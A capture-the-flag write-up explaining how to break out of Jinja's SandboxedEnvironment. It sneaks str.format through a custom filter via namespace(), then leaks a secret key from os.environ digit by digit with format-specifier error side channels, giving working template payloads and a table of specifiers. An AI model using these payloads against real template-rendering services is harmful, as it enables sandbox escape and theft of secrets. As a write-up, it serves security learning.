# MMM

### TL;DR

This challenge is about bypassing the Jinja `SandboxedEnvironment` templating engine. The idea is to trick Jinja into evaluating an arbitrary format string, from which we can leak the secret key via `os.environ` by side-channel.

### Format string vulnerability

By default, the `SandboxedEnvironment` blocks all calls to `.format` and `.format_map` originating from an object of type `str`. However, this check **does not** get applied when a Jinja filter is called. Therefore, we can theoretically craft an exploit by calling a filter with `'{...}'.format` as an argument such that that argument is used as a function. By sheer coincidence, none of Jinja's built-in filters are exploitable in this way (to my knowledge). However, let's take a look at the `median` function in `server.py`:

```py
def median(lst, high=True):
    lst.sort(key=lambda x: x if high else -x)
    return lst[len(lst)//2]
```

Since `lst` is unsanitized, we would like to pass a value such that `lst.sort` magically becomes `'{...}'.format`. There is no easy way to do this normally, so we have to make use of the `namespace()` feature, which allows keyword arguments to become class attributes for that object (e.g. `namespace(key=1).key` returns `1`). The following payload triggers a format string vulnerability:

```py
{{ namespace(sort='...'.format)|median }}
```

Now we can use classic pyjail tricks to obtain a reference to `os.environ`:

```py
{{ namespace(sort='key.__globals__[__builtins__].quit.__init__.__globals__[sys].modules[os].environ[KEY]'.format)|median }}
```

This alone, however, is not enough to leak the key because the format string is never actually *returned* by `median`. This leads to the next step of trying to side-channel the key.

### Side channel

Notice that a request to `/run` will return an error message if an `Exception` occurs while evaluating the template, followed by the type of error. We can use this to our advantage to leak the key. We can make use of the fact that format strings are nestable. For example, if the format string is `{x:{y[0]}}` and `y = 'abc'`, then it will expand to `{x:a}`. The `a` is now treated as the **format specifier**, which may lead to different behavior depending on what the specifier is and `x`'s type. We can abuse this in the case of our secret key. Let `{X}` be the `{key.__globals__[__builtins__].quit.__init__.__globals__[sys].modules[os].environ[KEY][i]}` (a.k.a. some character in the key). We know that `X` must be a hex digit. To leak each digit, we can execute the following payloads:

Payload | No Error | Error
--- | --- | ---
`{key.__code__.co_argcount:.{X}0000000000g}` | `0` | `123456789abcdef`
`{key.__code__.co_argcount:.2{X}47483647g}` | `01` | `23456789abcdef`
`{key.__code__.co_argcount:.{X}147483647g}` | `012` | `3456789abcdef`
`{key.__code__.co_argcount:.214748{X}647g}` | `0123` | `456789abcdef`
`{key.__code__.co_argcount:.21{X}7483647g}` | `01234` | `56789abcdef`
`{key.__code__.co_argcount:.2147483{X}48g}` | `012345` | `6789abcdef`
`{key.__code__.co_argcount:.2147483{X}47g}` | `0123456` | `789abcdef`
`{key.__code__.co_argcount:.214{X}483647g}` | `01234567` | `89abcdef`
`{key.__code__.co_argcount:.21474{X}3647g}` | `012345678` | `9abcdef`
`{key.__name__:{X}}` | `123456789` | `0abcdef`
`{key.__globals__[__builtins__].quit.__init__.__globals__[sys].modules[_thread].TIMEOUT_MAX:{X}}` | `0123456789ef` | `abcd`
`{key.__code__.co_argcount:{X}}` | `0123456789bcdef` | `a`
`{key.__code__.co_argcount:#{X}}` | `0123456789bdef` | `ac`
`{key.__code__.co_argcount:^{X}}` | `def` | `0123456789abc`

This is enough to distinguish all hex digits except for `e` and `f`. Since the 64 bytes long, there should be 8 of these occurrences. We can submit all 256 combinations to `/flag` until one works.

The solve script is given in [solve.py](solve.py).
